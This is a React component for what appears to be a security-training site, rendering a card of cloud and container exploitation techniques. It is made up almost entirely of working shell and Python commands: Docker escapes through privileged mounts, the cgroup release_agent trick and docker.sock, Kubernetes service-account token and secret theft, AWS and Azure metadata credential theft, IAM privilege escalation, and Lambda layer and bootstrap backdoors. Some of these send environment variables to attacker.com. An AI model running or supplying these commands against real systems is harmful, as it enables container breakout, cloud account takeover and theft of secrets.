
import React from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Cloud } from 'lucide-react';

const CloudContainerExploitation: React.FC = () => {
  return (
    <Card className="bg-cybr-card border-cybr-muted">
      <CardHeader>
        <div className="flex items-center gap-2">
          <Cloud className="h-6 w-6 text-cybr-primary" />
          <CardTitle className="text-cybr-primary">Cloud & Container Exploitation</CardTitle>
        </div>
      </CardHeader>
      <CardContent className="space-y-6">
        {/* Container Escape Techniques */}
        <div className="space-y-4">
          <h4 className="text-lg font-semibold text-cybr-accent">Container Escape & Privilege Escalation</h4>
          
          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold mb-3 text-cybr-primary">Docker Container Breakout Techniques</h5>
            <p className="text-sm mb-3 opacity-80">
              Advanced techniques for escaping Docker containers and gaining host system access.
            </p>
            <pre className="bg-black/50 p-3 rounded text-sm text-green-400 overflow-x-auto">
{`# Check for privileged container
cat /proc/1/cgroup
ls -la /dev/

# Method 1: Privileged container with host access
# If container is privileged, mount host filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host

# Method 2: Docker socket access
# If /var/run/docker.sock is mounted
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json

# Create new privileged container
curl -X POST --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  http://localhost/containers/create \
  -d '{
    "Image": "alpine",
    "Cmd": ["/bin/sh"],
    "HostConfig": {
      "Binds": ["/:/host"],
      "Privileged": true
    }
  }'

# Method 3: Capabilities exploitation
# Check available capabilities
capsh --print

# Exploit CAP_SYS_ADMIN
# Mount host filesystem
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/passwd > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Method 4: Kernel exploits
# Check kernel version
uname -a

# CVE specific exploits (example structure)
# Dirty COW, use-after-free, etc.
gcc -o exploit exploit.c
./exploit

# Method 5: Misconfigured volumes
# Check for sensitive mounts
mount | grep -E "(proc|sys|dev)"
ls -la /host/root/
ls -la /host/etc/shadow

# Method 6: Process namespace escape
# If PID namespace is shared
ps aux | grep -v '\[.*\]'
kill -9 1  # Try to kill host init (if shared)

# Method 7: Network namespace escape
# Check network configuration
ip addr show
ip route show
# Look for host network access`}
            </pre>
          </div>

          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold mb-3 text-cybr-primary">Kubernetes Privilege Escalation</h5>
            <pre className="bg-black/50 p-3 rounded text-sm text-green-400 overflow-x-auto">
{`# Check service account permissions
kubectl auth can-i --list
kubectl get serviceaccounts
kubectl get clusterrolebindings

# Method 1: Service account token abuse
# Default service account token location
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Use token to access Kubernetes API
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc.cluster.local/api/v1/namespaces/default/pods

# Method 2: Privilege escalation via RBAC misconfigurations
# Create privileged pod
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: privileged
    image: alpine
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
EOF

# Method 3: Node compromise via hostPath volumes
# Access host filesystem through mounted volumes
ls -la /host/etc/kubernetes/
cat /host/etc/kubernetes/admin.conf

# Method 4: Secrets enumeration
kubectl get secrets --all-namespaces
kubectl get secret <secret-name> -o yaml | grep -v '^#' | base64 -d

# Method 5: Pod escape via node access
# If pod has node access, SSH to other nodes
ssh -i /host/root/.ssh/id_rsa root@<other-node-ip>

# Method 6: Admission controller bypass
# Create pods with security context bypass
apiVersion: v1
kind: Pod
metadata:
  annotations:
    admission.controller/bypass: "true"
spec:
  securityContext:
    runAsUser: 0
    fsGroup: 0

# Method 7: Container runtime exploitation
# CVE-2019-5736 (runc escape)
# CVE-2020-15257 (containerd escape)
# Use specific exploits based on runtime version

# Check container runtime
kubectl get nodes -o wide
crictl version`}
            </pre>
          </div>
        </div>

        {/* Cloud Service Exploitation */}
        <div className="space-y-4">
          <h4 className="text-lg font-semibold text-cybr-accent">Cloud Service Advanced Exploitation</h4>
          
          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold mb-3 text-cybr-primary">AWS Metadata & IAM Exploitation</h5>
            <pre className="bg-black/50 p-3 rounded text-sm text-green-400 overflow-x-auto">
{`# AWS IMDS (Instance Metadata Service) exploitation
# Check IMDS version
curl -s http://169.254.169.254/latest/meta-data/

# IMDSv2 token-based access (bypass attempts)
# Get session token with longer TTL
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)

# Access metadata with token
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Extract IAM credentials
ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/)

CREDS=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE)

# Parse credentials
ACCESS_KEY=$(echo $CREDS | jq -r '.AccessKeyId')
SECRET_KEY=$(echo $CREDS | jq -r '.SecretAccessKey')
SESSION_TOKEN=$(echo $CREDS | jq -r '.Token')

# Configure AWS CLI with stolen credentials
aws configure set aws_access_key_id $ACCESS_KEY
aws configure set aws_secret_access_key $SECRET_KEY  
aws configure set aws_session_token $SESSION_TOKEN

# Enumerate IAM permissions
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2)

# Privilege escalation techniques
# Method 1: IAM policy manipulation (if permitted)
aws iam attach-user-policy --user-name target-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Method 2: Lambda function for privilege escalation
cat > lambda_function.py << 'EOF'
import boto3
import json

def lambda_handler(event, context):
    iam = boto3.client('iam')
    
    # Add admin policy to user
    iam.attach_user_policy(
        UserName='target-user',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    
    return {
        'statusCode': 200,
        'body': json.dumps('Privilege escalation complete')
    }
EOF

# Create and invoke Lambda
zip lambda.zip lambda_function.py
aws lambda create-function --function-name privesc \
  --runtime python3.8 --role $LAMBDA_ROLE \
  --handler lambda_function.lambda_handler --zip-file fileb://lambda.zip

aws lambda invoke --function-name privesc response.json

# Method 3: AssumeRole privilege escalation
# Find assumable roles
aws iam list-roles | jq '.Roles[] | select(.AssumeRolePolicyDocument | contains("sts:AssumeRole"))'

# Assume higher privileged role
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/HighPrivilegeRole --role-session-name exploit`}
            </pre>
          </div>

          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold mb-3 text-cybr-primary">Azure Managed Identity & Resource Exploitation</h5>
            <pre className="bg-black/50 p-3 rounded text-sm text-green-400 overflow-x-auto">
{`# Azure IMDS exploitation
# Get access token for managed identity
TOKEN=$(curl -s 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' \
  -H Metadata:true | jq -r '.access_token')

# Use token to access Azure Resource Manager
curl -s -H "Authorization: Bearer $TOKEN" \
  'https://management.azure.com/subscriptions?api-version=2020-01-01'

# Enumerate resources
SUBSCRIPTION_ID=$(curl -s -H "Authorization: Bearer $TOKEN" \
  'https://management.azure.com/subscriptions?api-version=2020-01-01' | \
  jq -r '.value[0].subscriptionId')

# List resource groups
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/resourcegroups?api-version=2020-06-01"

# Azure CLI authentication with managed identity
az login --identity
az account show

# Key Vault exploitation
# List Key Vaults
az keyvault list

# Access secrets (if permissions allow)
KEY_VAULT_NAME="target-keyvault"
az keyvault secret list --vault-name $KEY_VAULT_NAME
az keyvault secret show --vault-name $KEY_VAULT_NAME --name "database-password"

# Storage account exploitation
# List storage accounts
az storage account list

# Get storage account keys (if permissions allow)
STORAGE_ACCOUNT="targetstorageaccount"
RESOURCE_GROUP="target-rg"
az storage account keys list --account-name $STORAGE_ACCOUNT --resource-group $RESOURCE_GROUP

# Blob enumeration
az storage container list --account-name $STORAGE_ACCOUNT
az storage blob list --container-name sensitive-data --account-name $STORAGE_ACCOUNT

# VM exploitation
# List VMs
az vm list

# Execute commands on VMs (if permissions allow)
az vm run-command invoke --resource-group $RESOURCE_GROUP --name target-vm \
  --command-id RunShellScript --scripts "cat /etc/passwd"

# Azure AD token manipulation
# Get token for different resources
AAD_TOKEN=$(curl -s 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/' \
  -H Metadata:true | jq -r '.access_token')

# Access Microsoft Graph API
curl -s -H "Authorization: Bearer $AAD_TOKEN" \
  'https://graph.microsoft.com/v1.0/me'

# Enumerate Azure AD users
curl -s -H "Authorization: Bearer $AAD_TOKEN" \
  'https://graph.microsoft.com/v1.0/users'`}
            </pre>
          </div>
        </div>

        {/* Serverless Exploitation */}
        <div className="space-y-4">
          <h4 className="text-lg font-semibold text-cybr-accent">Serverless Function Exploitation</h4>
          
          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold mb-3 text-cybr-primary">AWS Lambda Advanced Attacks</h5>
            <pre className="bg-black/50 p-3 rounded text-sm text-green-400 overflow-x-auto">
{`# Lambda function enumeration
aws lambda list-functions
aws lambda get-function --function-name target-function

# Environment variable extraction
aws lambda get-function-configuration --function-name target-function | jq '.Environment.Variables'

# Cold start exploitation
# Deploy function with malicious dependencies
import subprocess
import os

def lambda_handler(event, context):
    # This runs during cold start, before handler execution
    if 'COLD_START_EXPLOIT' not in os.environ:
        os.environ['COLD_START_EXPLOIT'] = 'done'
        
        # Execute during cold start
        subprocess.run(['curl', 'http://attacker.com/coldstart', '-d', os.environ.get('AWS_LAMBDA_FUNCTION_NAME')])
    
    # Normal function logic
    return {'statusCode': 200}

# Lambda layer exploitation
# Create malicious layer
mkdir python
pip install requests -t python/
echo "import requests; requests.post('http://attacker.com/exfil', json=os.environ)" > python/malicious.py

zip -r layer.zip python/
aws lambda publish-layer-version --layer-name malicious-layer --zip-file fileb://layer.zip

# Function URL exploitation (if enabled)
# Direct HTTP access to Lambda functions
curl https://unique-id.lambda-url.region.on.aws/ -d '{"exploit": "payload"}'

# Event source mapping abuse
# Trigger functions with malicious events
aws lambda create-event-source-mapping \
  --function-name target-function \
  --event-source-arn arn:aws:sqs:region:account:malicious-queue

# Runtime manipulation
# Custom runtime exploitation
cat > bootstrap << 'EOF'
#!/bin/bash
# Malicious bootstrap script
curl http://attacker.com/runtime-start -d "$(env)"
exec /opt/original-runtime "$@"
EOF

chmod +x bootstrap
zip runtime.zip bootstrap
aws lambda create-function --function-name custom-runtime \
  --runtime provided --handler bootstrap

# Temporary filesystem exploitation
# /tmp is writable and persistent during execution context
def lambda_handler(event, context):
    # Write malicious files to /tmp
    with open('/tmp/malware', 'w') as f:
        f.write('malicious content')
    
    # Files persist across invocations in same container
    if os.path.exists('/tmp/persistent_data'):
        # Use data from previous invocation
        pass

# VPC Lambda exploitation
# If Lambda is in VPC, potential for lateral movement
import socket
import subprocess

def scan_internal_network():
    # Scan internal VPC network
    for i in range(1, 255):
        ip = f"10.0.1.{i}"
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ip, 22))
        if result == 0:
            # Found SSH service
            subprocess.run(['nmap', '-p', '22', ip])
        sock.close()`}
            </pre>
          </div>
        </div>
      </CardContent>
    </Card>
  );
};

export default CloudContainerExploitation;
